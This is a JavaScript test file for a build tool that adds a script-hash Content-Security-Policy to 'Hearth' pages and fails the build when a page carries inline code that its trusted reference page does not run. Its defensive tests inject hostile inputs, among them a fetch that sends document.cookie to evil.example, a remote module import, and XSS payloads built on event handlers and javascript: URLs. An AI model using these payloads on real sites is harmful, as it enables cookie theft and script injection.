// hearth-csp.test.mjs — the Hearth page's security policy: what it allows, who it trusts, where it sits, and that it governs ONLY the Hearth (POS-959).
//
// Darko (2026-11-01 15:54 EST) ruled "inline scripts forbidden by the page's security policy"; Wright (2026-11-09 00:38) ruled the shape: a
// Hearth-scoped meta policy in the repo, hashes for the TRUSTED HOST's scripts, the page's only policy, no edge or global one.
//
// THE AUTHORITY IS NOT THE PAGE'S OWN CONTENT. The permitted hashes come from the same house's entry-free household page; the Hearth page's
// inline scripts are only checked against them, and code the trusted host does not carry gets no authority and FAILS THE BUILD. The
// BUILD-INPUT tests below hold that: they hand the policy writer pages with entry-controlled executable code in them and require the
// build to stop, instead of hashing it. (qa-shots/hearth-walk.mjs proves the effective policy in a real browser.)

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createHash } from "node:crypto";
import {
  inlineScripts, hearthPolicy, withHearthPolicy, trustedHashes, applyHearthPolicy, hearthPages, inlineExecutableMarkup, HearthPolicyError,
} from "../tools/lib/hearth-csp.mjs";
import { prepareEntry } from "../src/lib/hearth/entries.mjs";

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const DIST = path.join(ROOT, "dist-town");
const built = fs.existsSync(path.join(DIST, "households"));
const sha = (t) => "sha256-" + createHash("sha256").update(t, "utf8").digest("base64");

const HOST_SCRIPTS = ["var host = 1;", "window.pmBell = true;"];
const HOST_MODULE = 'import "./host.js";';
const referencePage = (extra = "") => `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>house</title><script>${HOST_SCRIPTS[0]}</script><script type="module">${HOST_MODULE}</script><script src="/_astro/a.js" type="module"></script></head><body><script>${HOST_SCRIPTS[1]}</script>${extra}</body></html>`;
const hearthPage = (stage = "<p>entry</p>", extraHead = "") => `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>hearth</title>${extraHead}<script>${HOST_SCRIPTS[0]}</script><script type="module">${HOST_MODULE}</script><script src="/_astro/hearth.js" type="module"></script><script type="application/json" data-hearth-entries>[{"html":"<script>x</script>"}]</script></head><body><script>${HOST_SCRIPTS[1]}</script><div class="hearth-stage" data-hearth-stage>${stage}</div></body></html>`;
const TRUSTED = trustedHashes(referencePage());

// ── what a script is, and the policy text ──────────────────────────────────

test("inlineScripts: the inline scripts a page would execute, hashed from their exact text; external scripts and data blocks are not", () => {
  const s = inlineScripts(`<head><script>var a = 1;</script><script type="module">import "./x.js";</script><script src="/_astro/a.js" type="module"></script>` +
    `<script type="application/json" data-x>{"a":"</s"}</script><script type="application/ld+json">{}</script><script type="text/javascript">window.b=2</script></head>`);
  assert.deepEqual(s.map((x) => x.text), ["var a = 1;", 'import "./x.js";', "window.b=2"]);
  assert.equal(s[0].hash, sha("var a = 1;"));
  assert.deepEqual(inlineScripts("<p>none</p><script src=x></script>"), []);
});

test("the policy: scripts are 'self' and hashes only: no inline, eval, hashes-of-attributes, data:, blob:, https: or wildcard for script", () => {
  const p = hearthPolicy([sha("b"), sha("a"), sha("a")]);
  const script = /(?:^|; )script-src ([^;]*)/.exec(p)[1].split(" ");
  assert.equal(script[0], "'self'");
  assert.deepEqual(script.slice(1), [`'${sha("a")}'`, `'${sha("b")}'`].sort(), "each distinct hash once, sorted");
  for (const t of script) assert.ok(t === "'self'" || /^'sha256-[A-Za-z0-9+/]+={0,2}'$/.test(t), `an unexpected script source: ${t}`);
  assert.ok(!/unsafe-inline|unsafe-eval|unsafe-hashes|strict-dynamic|nonce-/.test(script.join(" ")));
  const dirs = Object.fromEntries(p.split("; ").map((d) => [d.split(" ")[0], d.split(" ").slice(1).join(" ")]));
  assert.equal(dirs["default-src"], "'self'");
  assert.equal(dirs["object-src"], "'none'");
  assert.equal(dirs["frame-src"], "'none'");
  assert.equal(dirs["base-uri"], "'self'");
  assert.equal(dirs["form-action"], "'self'");
  assert.equal(dirs["connect-src"], "'self' https://postmark.town", "the page may reach its own origin and the office's API, and nothing else");
  assert.ok(!/\*/.test(p) && !/["<>]/.test(p));
});

// ── the trusted host: positive authority, independent of the page ─────────

test("trustedHashes: the entry-free reference page's inline scripts; a missing reference or a Hearth page cannot be one", () => {
  assert.deepEqual([...TRUSTED].sort(), [sha(HOST_SCRIPTS[0]), sha(HOST_MODULE), sha(HOST_SCRIPTS[1])].sort());
  assert.throws(() => trustedHashes(""), HearthPolicyError);
  assert.throws(() => trustedHashes(undefined), /no trusted reference/);
  assert.throws(() => trustedHashes(hearthPage()), /cannot be the trusted reference/, "a Hearth page cannot vouch for itself or another");
});

test("withHearthPolicy: the host's own inline scripts get the policy; the meta sits right after the charset, before any script", () => {
  const out = withHearthPolicy(hearthPage(), TRUSTED);
  const meta = /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(out);
  assert.ok(meta && out.indexOf(meta[0]) < out.search(/<script\b/), "before the first script");
  assert.ok(out.startsWith('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv='));
  for (const t of [HOST_SCRIPTS[0], HOST_MODULE, HOST_SCRIPTS[1]]) assert.ok(meta[1].includes(`'${sha(t)}'`));
  assert.equal(out.replace(meta[0], ""), hearthPage(), "nothing else in the page changed");
  assert.equal((out.match(/Content-Security-Policy/g) ?? []).length, 1);
});

// ── BUILD-INPUT REGRESSIONS: code that is not the host's gets no authority, and the build stops ──

test("BUILD INPUT: an executable inline script inside the entry's stage is NOT hashed: the build fails", () => {
  const page = hearthPage(`<p>x</p><script>window.__pwned = "entry"</script>`);
  assert.throws(() => withHearthPolicy(page, TRUSTED), (e) => e instanceof HearthPolicyError && /1 inline executable script\(s\) the trusted host does not/.test(e.message) && !e.message.includes("__pwned"));
});

test("BUILD INPUT: an executable inline script OUTSIDE the stage, in the head or after it, is not hashed either (location is not trust)", () => {
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>", `<script>fetch("https://evil.example/" + document.cookie)</script>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>").replace("</body>", `<script type="module">import("https://evil.example/x.js")</script></body>`), TRUSTED), HearthPolicyError);
  // a script that LOOKS like a marker the host uses is still unknown code
  assert.throws(() => withHearthPolicy(hearthPage("<p>x</p>").replace("</body>", `<script data-astro-trusted data-hearth-host>alert(1)</script></body>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage(`</div><script>alert(1)</script><div>`), TRUSTED), HearthPolicyError, "closing the stage early does not move it into the host");
});

test("BUILD INPUT: an inline event handler or a javascript: URL in the page stops the build, however it is spelled", () => {
  for (const stage of [`<img src=x onerror="alert(1)">`, `<p onclick=alert(1)>x</p>`, `<a href="javascript:alert(1)">x</a>`, `<a href=" JaVa\tScRiPt:alert(1)">x</a>`, `<form action="javascript:alert(1)"></form>`]) {
    assert.throws(() => withHearthPolicy(hearthPage(stage), TRUSTED), (e) => e instanceof HearthPolicyError && /inline event handler|javascript: URL/.test(e.message), stage);
  }
  assert.deepEqual(inlineExecutableMarkup(hearthPage("<p>plain, with <a href=\"/x\">a link</a></p>")), { handlers: 0, jsUrls: 0 });
  assert.deepEqual(inlineExecutableMarkup(`<script>var s = "<p onclick=x>"</script><style>a[onclick]{}</style><p>ok</p>`), { handlers: 0, jsUrls: 0 }, "script and style bodies are not markup");
});

test("BUILD INPUT: a script with the host's EXACT text is the host's code (same bytes, same authority); one changed byte is not", () => {
  assert.doesNotThrow(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]}</script>`), TRUSTED));
  assert.throws(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]} </script>`), TRUSTED), HearthPolicyError);
  assert.throws(() => withHearthPolicy(hearthPage(`<script>${HOST_SCRIPTS[0]};alert(1)</script>`), TRUSTED), HearthPolicyError);
});

test("BUILD INPUT: without the trusted host's hashes there is no policy to write", () => {
  assert.throws(() => withHearthPolicy(hearthPage()), /needs the trusted host's script hashes/);
  assert.throws(() => withHearthPolicy(hearthPage(), new Set()), HearthPolicyError, "an empty trusted set trusts nothing, so the host's own scripts fail too");
  assert.throws(() => withHearthPolicy(withHearthPolicy(hearthPage(), TRUSTED), TRUSTED), /already carries a security policy/);
  assert.throws(() => withHearthPolicy("<p>no head</p>", TRUSTED), /no <head>/);
});

test("BUILD INPUT, through the real sanitizer: a hostile entry's markup reaches the page with NO executable code, and a script appended past it still stops the build", () => {
  const e = prepareEntry({
    id: "hostile", title: "h", html: `<p onclick="x()">a</p><script>window.__pwned=1</script><img src=x onerror=alert(1)><a href="javascript:alert(1)">b</a><svg onload=alert(1)></svg><iframe srcdoc="<script>alert(1)</script>"></iframe>`, css: "",
  });
  assert.ok(e.ok);
  const page = hearthPage(e.html);
  assert.deepEqual(inlineScripts(page).map((s) => s.hash).sort(), [...TRUSTED].sort(), "only the host's scripts are on the page");
  assert.doesNotThrow(() => withHearthPolicy(page, TRUSTED), "what the sanitizer wrote is accepted: it carries no code");
  assert.throws(() => withHearthPolicy(hearthPage(e.html + "<script>alert(1)</script>"), TRUSTED), HearthPolicyError, "if code got past the sanitizer, the build still stops");
});

// ── applyHearthPolicy on a scratch build output ────────────────────────────

const io = {
  readFile: (p) => fs.readFileSync(p, "utf8"),
  writeFile: (p, t) => fs.writeFileSync(p, t),
  listDir: (p) => fs.readdirSync(p).filter((n) => fs.statSync(path.join(p, n)).isDirectory()),
  exists: fs.existsSync,
  join: path.join,
};
function scratchBuild(houses) {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), "pos959-csp-"));
  const put = (rel, text) => { fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true }); fs.writeFileSync(path.join(dest, rel), text); };
  put("index.html", "<html><head></head><body>front</body></html>");
  for (const [slug, h] of Object.entries(houses)) {
    if (h.reference !== null) put(`households/${slug}/index.html`, h.reference ?? referencePage());
    put(`households/${slug}/hearth/index.html`, h.hearth ?? hearthPage());
  }
  return { dest, read: (rel) => fs.readFileSync(path.join(dest, rel), "utf8") };
}

test("applyHearthPolicy: each Hearth page is checked against ITS house's reference, written, and nothing else is touched", () => {
  const b = scratchBuild({ a: {}, b: {} });
  const before = b.read("households/a/index.html") + b.read("index.html");
  assert.deepEqual(applyHearthPolicy(b.dest, io).sort(), ["households/a/hearth/index.html", "households/b/hearth/index.html"]);
  assert.match(b.read("households/a/hearth/index.html"), /Content-Security-Policy/);
  assert.equal(b.read("households/a/index.html") + b.read("index.html"), before, "the household page and the rest of the site are untouched");
});

test("applyHearthPolicy: a Hearth page with code its house's reference lacks, or no reference at all, STOPS the build and writes nothing for it", () => {
  const bad = scratchBuild({ a: { hearth: hearthPage(`<script>alert(1)</script>`) } });
  const was = bad.read("households/a/hearth/index.html");
  assert.throws(() => applyHearthPolicy(bad.dest, io), HearthPolicyError);
  assert.equal(bad.read("households/a/hearth/index.html"), was, "not written");
  assert.throws(() => applyHearthPolicy(scratchBuild({ a: { reference: null } }).dest, io), /no trusted reference page/);
  // a reference that is itself a Hearth page is no reference
  assert.throws(() => applyHearthPolicy(scratchBuild({ a: { reference: hearthPage() } }).dest, io), /cannot be the trusted reference/);
});

test("hearthPages: only households/<slug>/hearth/index.html", () => {
  const tree = { households: ["a", "b", "c"], "households/a/hearth/index.html": 1, "households/b/index.html": 1, "households/c/hearth/index.html": 1 };
  assert.deepEqual(hearthPages((d) => tree[d] ?? [], (...p) => p.join("/"), (p) => p in tree), ["households/a/hearth/index.html", "households/c/hearth/index.html"]);
});

test("the integration is wired, fails the build on a refusal, and touches only the Hearth pages", () => {
  const cfg = fs.readFileSync(path.join(ROOT, "astro.config.town.mjs"), "utf8");
  assert.match(cfg, /import hearthCsp from '\.\/town\/scripts\/hearth-csp\.mjs'/);
  assert.match(cfg, /integrations: \[worldEngineIsland\(\), hearthCsp\(\)\]/);
  const src = fs.readFileSync(path.join(ROOT, "town/scripts/hearth-csp.mjs"), "utf8");
  assert.match(src, /applyHearthPolicy\(dest,/);
  assert.ok(!/try\s*\{|catch\s*\(/.test(src), "a refusal is not swallowed: it fails the build");
});

// ── the built site (skipped without a build, like the funding tests: run `npm run build` first) ──

function everyPage(dir, out = []) {
  for (const n of fs.readdirSync(dir)) {
    const p = path.join(dir, n);
    if (fs.statSync(p).isDirectory()) everyPage(p, out); else if (n.endsWith(".html")) out.push(p);
  }
  return out;
}

test("built: every Hearth page carries exactly one policy, before its scripts, and every inline script it allows is one its OWN house's entry-free page also runs", { skip: !built }, () => {
  const slugs = fs.readdirSync(path.join(DIST, "households")).filter((s) => fs.existsSync(path.join(DIST, "households", s, "hearth", "index.html")));
  assert.ok(slugs.length > 10, "there are Hearth pages in the build");
  for (const slug of slugs) {
    const p = path.join(DIST, "households", slug, "hearth", "index.html");
    const html = fs.readFileSync(p, "utf8");
    const metas = [...html.matchAll(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/g)];
    assert.equal(metas.length, 1, `${slug}: one policy`);
    assert.ok(html.indexOf(metas[0][0]) < html.search(/<script\b/), `${slug}: policy before the first script`);
    const scripts = /script-src ([^;]*)/.exec(metas[0][1])[1];
    assert.ok(!/unsafe-inline|unsafe-eval/.test(scripts), `${slug}: no inline allowance for script`);
    const reference = trustedHashes(fs.readFileSync(path.join(DIST, "households", slug, "index.html"), "utf8"));
    const allowed = [...scripts.matchAll(/'(sha256-[^']+)'/g)].map((m) => m[1]);
    assert.ok(allowed.length > 0);
    for (const h of allowed) assert.ok(reference.has(h), `${slug}: ${h} is allowed but the house's own entry-free page does not run it`);
    for (const s of inlineScripts(html)) assert.ok(allowed.includes(s.hash), `${slug}: an inline script has no allowance`);
    assert.deepEqual(inlineExecutableMarkup(html), { handlers: 0, jsUrls: 0 }, `${slug}: no inline handler or javascript: URL`);
  }
});

test("built: NO other page carries a policy: the household page, the rail and every other route are untouched", { skip: !built }, () => {
  const others = everyPage(DIST).filter((p) => !/\/households\/[^/]+\/hearth\/index\.html$/.test(p));
  assert.ok(others.length > 1000, "the rest of the site is in the build");
  const withPolicy = others.filter((p) => /http-equiv="?Content-Security-Policy/i.test(fs.readFileSync(p, "utf8")));
  assert.deepEqual(withPolicy, []);
});
